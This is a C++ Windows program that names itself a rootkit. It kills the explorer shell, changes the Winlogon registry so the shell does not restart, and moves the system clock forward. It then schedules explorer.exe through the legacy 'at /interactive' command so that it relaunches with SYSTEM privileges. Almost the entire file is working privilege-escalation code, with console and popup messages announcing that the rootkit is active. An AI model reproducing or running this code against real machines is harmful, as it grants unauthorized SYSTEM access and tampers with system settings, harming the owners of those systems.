#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <unistd.h>
#include <time.h>
#include <string>
#include <cstring>
#include <cmath>
#include <iostream>
// using namespace std;

int run_command(STARTUPINFO* si, PROCESS_INFORMATION* pi, char* command) 
{
    if (!CreateProcess(
        NULL,   // No module name (use command line)
        ((LPSTR) command),        // file to run
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        0,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        si,            // Pointer to STARTUPINFO structure
        pi)           // Pointer to PROCESS_INFORMATION structure
    )
    {
        int error = GetLastError();
        printf("\nERROR: %d Create Process FAILED:\n%s\n", error, command);
        return error;
    }
    return 0;
}


struct tm* get_time()
{
    time_t rawtime;

    time (&rawtime);

    struct tm* time = new struct tm;
    time = localtime (&rawtime);
    return time;
}

// If timeinfo isn't provided get current time
const char * default_format = "%H:%M:%S";
char* get_time_string(struct tm* timeinfo = get_time(), char* timeformat=(char*)default_format)
{
    char* buffer = new char[10];
    strftime (buffer, 9, timeformat, timeinfo);
    return buffer;
}

// This returns a time string of format %H:%M or %H:%M:%S
// It takes an optional seed argument, which specifies what time for seconds_from_now, needed for calculating multiple times for the same moment
struct tm* get_incremented_time(int seconds_from_now, struct tm* seed=get_time())
{
    struct tm* timeinfo = new struct tm;
    memcpy(timeinfo, seed, sizeof(struct tm));

    int unit_Total;

    // Calculate seconds;
    unit_Total = seconds_from_now + timeinfo->tm_sec;

    if(unit_Total < 0)
    {
        unit_Total = 60+unit_Total;
        timeinfo->tm_min = timeinfo->tm_min-1;

        if(timeinfo->tm_min < 0) {
            timeinfo->tm_min = 60+timeinfo->tm_min;
            timeinfo->tm_hour = timeinfo->tm_hour-1;
            
            if(timeinfo->tm_hour < 0) {
                timeinfo->tm_hour = timeinfo->tm_hour + 24;
            }
        }
    }

    timeinfo->tm_sec = unit_Total % 60;

    // Calculate minutes;
    unit_Total = floor(unit_Total/60) + timeinfo->tm_min;
    if(unit_Total < 0)
    {
        unit_Total = 60+unit_Total;
    }

    timeinfo->tm_min = unit_Total % 60;

    // Calculate hours;
    unit_Total = floor(unit_Total/60) + timeinfo->tm_hour;
    if(unit_Total < 0)
    {
        unit_Total = 24+unit_Total;
    }

    timeinfo->tm_hour = unit_Total % 24;

    return timeinfo;
}

char* create_schedule_string(char* command, char* time)
{
    // 2047 is max cmd command length
    char* command_Schedule = new char[2047];
    strcpy(command_Schedule, "at ");
    strcat(command_Schedule, time);
    strcat(command_Schedule, " /interactive ");
    strcat(command_Schedule, command);

    return command_Schedule;
}

int main( )
{
	// ::ShowWindow(::GetConsoleWindow(), SW_HIDE); 
	STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );    

    printf("\nBeginning setup...\n");

    char command_KillExplorer[] = "tskill /A explorer";
    char command_StopShellRestart[] = "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /t REG_DWORD /V \"AutoRestartShell\" /d 0 /f";
    // Might need a better way to get sessionID, for now 0 works
    char command_Msg[] = "msg 0 \"Rootkit Enabled\"";
    char command_OpenExplorer[] = "explorer.exe";

    // Formatting for get_incremented_time which returns a time string of this format
    char min_Format[] = "%H:%M";
    char sec_Format[] = "%H:%M:%S";

    // Need to use a time seed for both these calculation or it could be a race case
    struct tm* right_now = get_time();

    // Provide the seed for right_now
    struct tm* increment_one_minute = get_incremented_time(60-right_now->tm_sec, right_now);
    // Get strings
    char* rightNow = get_time_string(right_now, sec_Format);
    char* oneMinuteLater = get_time_string(increment_one_minute, min_Format);
    char* twoSecondsBeforeOneMinuteLater = get_time_string(get_incremented_time(-2, increment_one_minute), sec_Format);
    char* twoSecondsAfterStart = get_time_string(get_incremented_time(2, right_now), sec_Format);

    // char* schedule_Msg = create_schedule_string(command_Msg, time);
    char* schedule_Explorer = create_schedule_string(command_OpenExplorer, oneMinuteLater);

    char command_TimeSkip[20] = "0";
    strcpy(command_TimeSkip, "time ");
    strcat(command_TimeSkip, twoSecondsBeforeOneMinuteLater);

    printf("\nStarting rootkit: %s \n", rightNow);
    // Skip the time to two seconds before one minute later, so only 2 seconds of perceived delay
    run_command(&si, &pi, command_TimeSkip);

    // Stop the shell from automatically restarting
    run_command(&si, &pi, command_StopShellRestart);

    // Kill the explorer
    run_command(&si, &pi, command_KillExplorer);

    // Print a message saying the rootkit is enabled
    run_command(&si, &pi, command_Msg);

    // Open the explorer one minute later with the sheduler, it will have system privileges
    run_command(&si, &pi, schedule_Explorer);    

    // Wait for the time skip then set the time back
    // Sleep(2000);
    // printf("Time jumped: %s\n", twoSecondsBeforeOneMinuteLater);

    // DEBUG
    // printf("oneMinuteLater: %s\n", oneMinuteLater);
    // printf("twoSecondsBeforeOneMinuteLater: %s\n", twoSecondsBeforeOneMinuteLater);

    // Reset the time
    // command_TimeSkip[20] = 0;
    // strcat(command_TimeSkip, "time ");
    // strcat(command_TimeSkip, twoSecondsAfterStart);

    // run_command(&si, &pi, command_TimeSkip);

    // Wait until child process exits.
    WaitForSingleObject( pi.hProcess, INFINITE );

    // Cleanup
    delete right_now;

    // Close process and thread handles. 
    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );

    return 0;
}
